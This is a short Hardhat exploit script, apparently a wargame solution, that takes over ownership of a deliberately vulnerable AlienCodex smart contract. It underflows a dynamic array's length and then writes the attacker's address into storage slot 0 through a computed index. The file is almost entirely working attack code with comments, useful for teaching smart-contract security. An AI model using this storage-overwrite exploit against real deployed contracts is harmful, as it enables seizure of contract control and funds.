const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");

const ALIEN_CONTRACT_NAME = "AlienCodex";
const ALIEN_CONTRACT_ADDRESS = "0x300eA0e3704EfC665efbA4CA5EadBD2a89975333";

async function main() {
    const [attacker] = await ethers.getSigners();

    const alienFactory = await ethers.getContractFactory(ALIEN_CONTRACT_NAME);
    const alienContract = alienFactory.attach(ALIEN_CONTRACT_ADDRESS);

    // Change contact value to true, to interact with the access controlled functions
    let tx = await alienContract.makeContact();
    await tx.wait();

    // Call retract method, such that because our codex array length is 0, it will underflow, resulting in having its length equal to the size of the storage.
    tx = await alienContract.retract();
    await tx.wait();

    // Thus now we can calculate the slot of the owner and change it to claim ownership
    const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
    const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));

    const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
    const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);

    // Pad our address to the required format
    const parsedAddress = ethers.utils.hexZeroPad(attacker.address, 32);

    tx = await alienContract.revise(ownerPositionInMap, parsedAddress);
    await tx.wait();
}


main().catch(error => {
    console.error(error);
    process.exit(1);
})